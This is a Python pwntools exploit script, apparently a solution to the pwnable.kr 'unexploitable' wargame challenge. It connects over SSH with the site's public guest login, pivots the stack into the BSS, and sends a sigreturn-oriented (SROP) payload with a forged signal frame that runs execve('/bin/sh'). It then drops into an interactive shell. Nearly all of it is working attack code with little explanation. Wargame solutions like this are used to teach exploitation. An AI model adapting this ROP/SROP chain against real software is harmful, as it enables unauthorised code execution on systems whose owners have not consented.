#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

import time
from pwn import *
context.update(arch = 'amd64', os = 'linux', log_level = 'info')

elf  = ELF('./unexploitable', checksec=False)

# ROP Gadgets
pop_rbp_ret = 0x400512  # pop rbp ; ret
syscall     = 0x400560  # syscall

# Memory Locations
bin_sh_ptr  = elf.bss() + 0x500

# Byte sequence alias
A8 = 8 * b'A'


def sys_execve_signal_frame() -> bytes:
    frame = SigreturnFrame()
    frame.rax = 59          # sys_execve
    frame.rdi = bin_sh_ptr  # &"/bin/sh"
    frame.rsi = 0           # NULL
    frame.rdx = 0           # NULL
    frame.rip = syscall     # ret2syscall again
    return bytes(frame)

def main():
    '''
    leave = mov rsp, rbp ; pop rbp
    '''
    #proc = elf.process()
    #log.debug('You may attatch this process to gdb now.')
    #input()

    remote = ssh(host="pwnable.kr", user="unexploitable", password="guest", port=2222)
    proc = remote.process('/home/unexploitable/unexploitable')

    log.info('migrating stack to bss')
    payload  = A8 * 3                     # padding
    payload += p64(pop_rbp_ret)           # ret
    payload += p64(bin_sh_ptr + 0x10)     # rbp
    payload += p64(elf.sym['main'] + 23)  # ret (return to main()+23, calling read() again)
    time.sleep(3)
    proc.send(payload)


    log.info('writing SROP payload')
    payload  = A8 * 3                     # padding
    payload += p64(elf.sym['read'])       # ret (return to read@plt, reading 15 bytes)
    payload += p64(syscall)               # ret (return to sys_rt_sigreturn)
    payload += sys_execve_signal_frame()  # fake signal frame
    time.sleep(3)
    proc.send(payload)


    log.info('writing /bin/sh and setting rax to 15')
    time.sleep(0.1)
    proc.send(b'/bin/sh'.ljust(15, b'\x00'))


    log.info('shell opened')
    proc.interactive()


if __name__ == '__main__':
    main()
